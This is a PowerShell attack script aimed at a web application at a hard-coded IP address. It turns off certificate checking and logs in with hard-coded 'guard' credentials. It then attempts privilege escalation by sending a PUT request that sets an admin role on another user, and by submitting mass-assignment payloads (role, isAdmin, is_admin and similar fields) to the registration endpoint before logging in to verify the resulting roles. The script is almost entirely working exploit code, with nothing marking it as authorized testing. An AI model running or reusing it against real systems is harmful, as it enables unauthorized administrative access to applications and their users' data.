$ProgressPreference = 'SilentlyContinue'
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCerts5 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts5
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

Write-Host "=== 1. Login as Guard ==="
$loginResp = Invoke-WebRequest -Uri 'https://3.218.72.109/api/auth/login' -Method POST -Body '{"username":"guard","password":"guard123"}' -ContentType 'application/json' -UseBasicParsing -TimeoutSec 15 -WebSession $session
Write-Host "Guard Login: $($loginResp.Content)"

Write-Host ""
Write-Host "=== 2. Check Guard Requests ==="
$reqsResp = Invoke-WebRequest -Uri 'https://3.218.72.109/api/guard/requests' -UseBasicParsing -TimeoutSec 15 -WebSession $session
Write-Host "Requests: $($reqsResp.Content)"

Write-Host ""
Write-Host "=== 3. Try to access Admin user management with PUT parameter tampering or other methods ==="
# Try sending role parameter in profile update or other endpoints if any
try {
    $adminPut = Invoke-WebRequest -Uri 'https://3.218.72.109/api/admin/users/2' -Method PUT -Body '{"role":"admin"}' -ContentType 'application/json' -UseBasicParsing -TimeoutSec 15 -WebSession $session
    Write-Host "PUT /api/admin/users/2 Status: $($adminPut.StatusCode) -> $($adminPut.Content)"
} catch {
    Write-Host "PUT /api/admin/users/2 Error: $($_.Exception.Message)"
}

Write-Host ""
Write-Host "=== 4. Check if there are other parameters in /api/auth/register that accept role ==="
$regPayloads = @(
    '{"username":"test_adm1","password":"password123","full_name":"Test Admin","role":"admin"}',
    '{"username":"test_adm2","password":"password123","full_name":"Test Admin","userRole":"admin"}',
    '{"username":"test_adm3","password":"password123","full_name":"Test Admin","isAdmin":true}',
    '{"username":"test_adm4","password":"password123","full_name":"Test Admin","is_admin":1}',
    '{"username":"test_adm5","password":"password123","full_name":"Test Admin","type":"admin"}'
)

foreach ($p in $regPayloads) {
    try {
        $reg = Invoke-WebRequest -Uri 'https://3.218.72.109/api/auth/register' -Method POST -Body $p -ContentType 'application/json' -UseBasicParsing -TimeoutSec 15
        Write-Host "Register payload: $p"
        Write-Host "Response: $($reg.Content)"
    } catch {
        Write-Host "Register payload error: $($_.Exception.Message)"
    }
}

Write-Host ""
Write-Host "=== 5. Login as created users to verify their roles ==="
foreach ($u in @("test_adm1", "test_adm2", "test_adm3", "test_adm4", "test_adm5")) {
    try {
        $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $l = Invoke-WebRequest -Uri 'https://3.218.72.109/api/auth/login' -Method POST -Body "{\`"username\`":\`"$u\`",\`"password\`":\`"password123\`"}" -ContentType 'application/json' -UseBasicParsing -TimeoutSec 15 -WebSession $s
        Write-Host "User $u login -> $($l.Content)"
    } catch {
        # ignore if user wasn't created
    }
}
